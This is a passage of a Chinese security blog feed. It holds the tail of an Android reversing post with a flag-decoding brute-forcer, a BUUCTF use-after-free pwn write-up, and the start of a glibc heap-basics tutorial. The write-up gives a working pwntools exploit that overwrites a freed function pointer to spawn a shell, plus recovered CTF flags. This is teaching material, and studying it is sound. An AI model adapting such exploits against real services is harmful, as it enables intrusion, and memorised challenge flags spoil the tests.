存放的地址：<code>0x7FFF5A3772A0</code> 处生成了数据</p><p>提取出来得到密文：<code>jm0g3&#123;djyalj&#123;4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20REVERSE_Android%20%E9%80%86%E5%90%9128.png" alt="CTF - REVERSE_Android 逆向28.png"></p><p>根据加密逻辑暴力破解：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> enc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"jm0g3&#123;djyalj&#123;4og3k1vequwbi:f61:6f;36:;2dkkfAWRjSv2UFDukk"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> dec<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">56</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">127</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>                dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">45</span> <span class="token operator">-</span> <span class="token number">5</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x30</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0x19</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x19</span><span class="token punctuation">)</span>                    dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">62</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                dec <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">-</span> <span class="token number">94</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1A</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span>            dec <span class="token operator">=</span> dec <span class="token operator">^</span> <span class="token number">3</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dec <span class="token operator">==</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token number">65</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">&lt;=</span> j <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到 flag：<code>fk0a7udfwylfu4ia7e9rcosqDg6b2962b572658deebQNfMr8Ssee</code></p>]]></content>
    
    
    <summary type="html">总结一下安卓逆向中的一些知识点，包括如何静态分析安卓程序，以及如何使用 IDA 来动态调试安卓程序的 so 文件</summary>
    
    
    
    <category term="逆向工程" scheme="https://www.uf4te.cn/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    
    <category term="Reverse" scheme="https://www.uf4te.cn/tags/Reverse/"/>
    
    <category term="IDA" scheme="https://www.uf4te.cn/tags/IDA/"/>
    
  </entry>
  
  <entry>
    <title>【BUUCTF】hitcontraining_uaf</title>
    <link href="https://www.uf4te.cn/posts/1cb138a7.html"/>
    <id>https://www.uf4te.cn/posts/1cb138a7.html</id>
    <published>2024-05-17T08:21:50.000Z</published>
    <updated>2024-06-05T06:36:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>堆中的 ret2text</p></li><li><p><mark>利用 UAF 漏洞，两次 <code>free</code>，一次 <code>malloc</code>，篡改被释放的堆中的数据为后门函数地址，然后再打印被释放的堆块内容触发后门函数</mark></p></li></ul><hr><p><a href="https://buuoj.cn/challenges#hitcontraining_uaf">【BUUCTF】hitcontraining_uaf</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>查看保护机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf1.png" alt="【BUUCTF】hitcontraining_uaf1.png"></p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf2.png" alt="【BUUCTF】hitcontraining_uaf2.png"></p><p>一个经典菜单题，IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf3.png" alt="【BUUCTF】hitcontraining_uaf3.png"></p><p>主要漏洞发生在 <code>del_note()</code> 中：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf4.png" alt="【BUUCTF】hitcontraining_uaf4.png"></p><p>通过 <code>free</code> 释放内存后未置 0，存在 UAF 漏洞</p><p>同时存在一个后门函数 <code>magic()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf5.png" alt="【BUUCTF】hitcontraining_uaf5.png"></p><p>结合 GDB 调试，分析一下 <code>add_note()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf7.png" alt="【BUUCTF】hitcontraining_uaf7.png"></p><p>验证一下我们的分析，使用一次 <code>add_note(32, b&#39;aaaa&#39;)</code> 后堆结构如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf9.png" alt="【BUUCTF】hitcontraining_uaf9.png"></p><p>第一个堆块我们无法控制，它有两个指针，一个指向 <code>print_note_content()</code> 函数，一个指向 <code>note chunk</code>，我们只能控制第二个堆块 <code>note chunk</code> 的 <code>content</code></p><p>为了方便理解，用图表示出来就是这样：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf8.png" alt="【BUUCTF】hitcontraining_uaf8.png"></p><p><code>print_note()</code> 函数用于输出 <code>note chunk</code> 中的 <code>content</code> 内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf10.png" alt="【BUUCTF】hitcontraining_uaf10.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf11.png" alt="【BUUCTF】hitcontraining_uaf11.png"></p><blockquote><p>由于存在 UAF 漏洞，于是我们的想法是覆盖 <code>notelist[i][0]</code> 的指针，使其指向 <code>magic()</code> 函数的地址</p><p>我们再通过 <code>print_note()</code> 函数将 <code>notelist[i][1]</code> 指向的 <code>note chunk</code> 打印，就会调用 <code>notelist[i][0]</code> 指向的 <code>magic()</code> 函数获得 shell</p></blockquote><p>首先，创建两个 <code>note chunk</code>（实际上创建了 4 个堆，因为还有 2 个 <code>notelist</code> 堆）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf12.png" alt="【BUUCTF】hitcontraining_uaf12.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf13.png" alt="【BUUCTF】hitcontraining_uaf13.png"></p><p>分别释放它们：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf14.png" alt="【BUUCTF】hitcontraining_uaf14.png"></p><p>此时如果我们再通过 <code>add_note()</code> 创建 <code>new_note chunk</code></p><p>由于 <code>add_note()</code> 会创建两个堆块，而 <code>fast bin</code> 是后进先出的，会申请到 <code>fastbin[0x10]</code> 中的两个 <code>fast bin</code>，即 <code>0x9f4d038</code> 和 <code>0x9f4d000</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf15.png" alt="【BUUCTF】hitcontraining_uaf15.png"></p><p>然后我们覆盖 <code>new_note chunk</code> 的第一个内容为后门函数 <code>magic()</code> 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf16.png" alt="【BUUCTF】hitcontraining_uaf16.png"></p><p>由于存在 UAF 漏洞，之前 <code>free</code> 掉的 <code>notelist[0]</code> 和 <code>note chunk 0</code> 依然是可以使用的</p><p>我们其实相当于将之前 <code>notelist[0][0]</code> 指向 <code>print_note_content()</code> 函数的指针篡改为了指向 <code>magic()</code> 函数的指针</p><p>然后调用 <code>print_note()</code> 函数，打印被 <code>free</code> 掉的 <code>note chunk 0</code> 的内容，此时就会执行 <code>notelist[0][0]</code> 处的 <code>magic()</code> 函数，触发后门函数拿到 shell</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./hacknote"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hacknote"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">27407</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Note size :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content :'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add_note<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>magic_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{6e193074-b875-4c2a-bb9d-3828320fa467}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BUUCTF%E3%80%91hitcontraining_uaf6.png" alt="【BUUCTF】hitcontraining_uaf6.png"></p>]]></content>
    
    
    <summary type="html">可以说是堆中的 ret2text，作为堆的入门例题吧，利用 UAF 漏洞篡改被释放的堆块内容为后门函数地址</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>堆基础</title>
    <link href="https://www.uf4te.cn/posts/463ab4ed.html"/>
    <id>https://www.uf4te.cn/posts/463ab4ed.html</id>
    <published>2024-05-15T12:04:36.000Z</published>
    <updated>2024-06-05T06:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><blockquote><p>堆（heap）是一种数据结构，在程序运行的过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存</p><p>堆是程序虚拟地址空间中的一块连续的线性区域，它<strong>由低地址向高地址方向增长（和栈的增长方向相反）</strong>，管理堆的程序也称为堆管理器</p><p>参考文章：  </p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-overview/">堆概述 - CTF Wiki</a>  </li><li><a href="https://wiki.wgpsec.org/">狼组安全团队公开知识库</a></li></ol></blockquote><p>目前 Linux 标准发行版中使用的堆分配器是 Glibc 中的堆分配器：<code>ptmalloc2</code></p><p>堆的基本操作是分配和回收，<code>ptmalloc2</code> 主要通过 <code>malloc()</code> 和 <code>free()</code> 函数来分配和释放内存块</p><hr><h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><blockquote><p>函数声明：<code>void *malloc(size_t size)</code></p><p><code>size</code> 是内存块的大小，以字节为单位</p></blockquote><p><code>malloc()</code> 的作用是分配所需的内存空间（<em>不会对内存空间进行初始化</em>），并返回一个指向它的指针；如果请求失败，则返回 NULL</p><ul><li><p>当 <code>size = 0</code> 时，返回当前系统允许的堆的最小内存块</p></li><li><p>当 <code>size</code> 为负数时，<strong>由于在大多数系统上，size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配</p></li></ul><p>以一个简单的例子来看看 <code>malloc()</code> 函数和堆：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过 GDB 调试可以看到，在执行 <code>malloc()</code> 函数前，程序的地址空间里是没有堆的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA1.png" alt="CTF - PWN_堆与堆溢出1.png"></p><p>执行 <code>malloc()</code> 函数后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA2.png" alt="CTF - PWN_堆与堆溢出2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA3.png" alt="CTF - PWN_堆与堆溢出3.png"></p><p>可见程序中最开始是没有堆这部分空间的，在用户通过 <code>malloc()</code> 申请内存后才会出现，并且会一次性申请很大空间的堆段（<code>0x555555559000 ~ 0x55555557a000</code>）</p><blockquote><p>注意：新版本的 Glibc 对堆结构的管理有些区别，上图是在 Glibc 2.37 的 Kali Linux 2024.1 中进行的测试</p><p>而在 Glibc 2.23 的 Ubuntu 16.04 中是这样的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA6.png" alt="CTF - PWN_堆与堆溢出6.png"></p></blockquote><hr><h4 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h4><blockquote><p>函数声明：<code>void *calloc(size_t nitems, size_t size)</code></p><p><code>nitems</code> 为要被分配的元素个数；<code>size</code> 为元素的大小</p></blockquote><p><code>calloc()</code> 在功能上与 <code>malloc()</code> 几乎相同，区别在于 <em><code>calloc()</code> 申请内存空间后会将其全部初始化为 0</em></p><p>使用 <code>calloc()</code> 函数时需要注意，如果分配的内存块过大，可能会导致内存不足的问题</p><hr><h4 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h4><blockquote><p>函数声明：<code>void *realloc(void *ptr, size_t size)</code></p><p><code>ptr</code> 是一个指向要重新分配内存的内存块的指针；<code>size</code> 是内存块的新的大小，以字节为单位</p></blockquote><p><code>realloc()</code> 的作用是重新调整之前通过 <code>malloc()</code> 或 <code>calloc()</code> 所分配的 <code>ptr</code> 所指向的内存块的大小，并返回一个指向重新分配大小的内存的指针；如果请求失败，则返回 NULL</p><ul><li><p>如果 <code>ptr</code> 为空指针，则会分配一个新的内存块，且函数返回一个指向它的指针，相当于 <code>malloc()</code></p></li><li><p>如果 <code>size = 0</code>，且 <code>ptr</code> 指向一个已存在的内存块，则 <code>ptr</code> 所指向的内存块会被释放，并返回一个空指针，相当于 <code>free()</code></p></li></ul><p>另外，针对重新申请的大小与之前申请内存的大小的关系，又有三种不同的情况：</p><ol><li><p>如果重新申请的大小 &gt; 之前申请内存的大小，且当前内存段后面有需要的内存空间，则直接扩展这段内存空间，<code>realloc()</code> 将返回原指针</p></li><li><p>如果重新申请的大小 &gt; 之前申请内存的大小，且当前内存段后面的空闲空间不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块地址，相当于 <code>free() + malloc()</code></p></li><li><p>如果重新申请的大小 &lt; 之前申请内存的大小，堆块会直接缩小，被削减的内存会释放，这里的释放与 <code>free()</code> 不同</p></li></ol><hr><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><blockquote><p>函数声明：<code>void free(void *ptr)</code></p><p><code>ptr</code> 是一个指向要释放内存的内存块的指针</p></blockquote><p><code>free()</code> 的作用是释放之前通过 <code>malloc()</code>、<code>calloc()</code> 或 <code>realloc()</code> 所分配的内存空间，该函数不返回任何值</p><ul><li><p>如果传递的参数 <code>ptr</code> 是一个空指针，则不会执行任何动作</p></li><li><p>当参数 <code>ptr</code> 已经被释放之后，再次释放会出现乱七八糟的效果（Double Free）</p></li><li><p>当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间（被 <code>mallopt</code> 禁用的情况下除外）</p></li></ul><p>还是以上面的例子来看，执行 <code>free()</code> 之后堆段并不会消失：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA4.png" alt="CTF - PWN_堆与堆溢出4.png"></p><p>但是堆中的内容发生了变化：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA5.png" alt="CTF - PWN_堆与堆溢出5.png"></p><p>我们申请的空间变成了 <code>Free chunk</code></p><blockquote><p>注意：新版本的 Glibc 对堆结构的管理有些区别，上图是在 Glibc 2.37 的 Kali Linux 2024.1 中进行的测试</p><p>而在 Glibc 2.23 的 Ubuntu 16.04 中是这样的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA7.png" alt="CTF - PWN_堆与堆溢出7.png"></p></blockquote><p>通过 <code>free()</code> 释放的堆块不会立刻被回收，它们会变成 <code>Free chunk</code> 并加上了一种 <code>xxx bin</code> 的名字，例如上图 Glibc 2.23 中的 <code>fastbins</code>（<code>fast bin</code>）</p><p><em>通常来说，当堆块释放后，如果与另一个被释放的堆块或者 <code>top chunk</code> 相邻，则这些空间会被合并</em>（<strong>但是 fast bin 是个特例，不会轻易合并</strong>）</p><hr><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><blockquote><p>无论是 <code>malloc</code> 函数还是 <code>free</code> 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数</p><p>这些函数背后的系统调用主要是 <code>brk</code> 函数以及 <code>mmap</code> 函数</p></blockquote><ol><li><p><code>brk</code> 是将 DATA 数据段的最高地址指针 <code>_edata</code> 往高地址推（<code>_edata</code> 指向数据段的最高地址）</p></li><li><p><code>mmap</code> 是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存</p></li></ol><p><code>brk</code> 和 <code>mmap</code> 这两种方式分配的都是虚拟内存，没有分配物理内存</p><p>在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系</p><ul><li><code>malloc</code> 小于 <code>128k</code>（<code>0x20000</code> 字节）的内存时，使用 <code>brk</code> 分配内存</li><li><code>malloc</code> 大于等于 <code>128k</code>（<code>0x20000</code> 字节）的内存时，使用 <code>mmap</code> 分配内存，在堆和栈之间找一块空闲内存分配</li></ul><p>第一次执行 <code>malloc</code> 可能出现的系统调用如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA19.png" alt="CTF - PWN_堆与堆溢出19.png"></p><blockquote><p>注意：</p><p><code>brk</code> 会直接拓展原来的堆，<code>mmap</code> 会单独映射一块内存</p><p><strong><code>mmap</code> 分配的内存与 libc 基地址之前存在固定的偏移，因此可以推算出 libc 的基地址</strong></p></blockquote><hr><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4><blockquote><p>对于堆的操作，操作系统提供了 <code>brk</code> 函数，Glibc 库提供了 <code>sbrk</code> 函数，我们可以通过增加 <code>brk</code> 的大小来向操作系统申请内存</p></blockquote><p>初始时，堆的起始地址 <code>start_brk</code> 以及堆的当前末尾 <code>brk</code> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同：</p><ul><li>不开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code> 会指向 DATA&#x2F;BSS 段的结尾。</li><li>开启 ASLR 保护时，<code>start_brk</code> 以及 <code>brk</code> 也会指向同一位置，只是这个位置是在 DATA&#x2F;BSS 段结尾后的随机偏移处</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA18.png" alt="CTF - 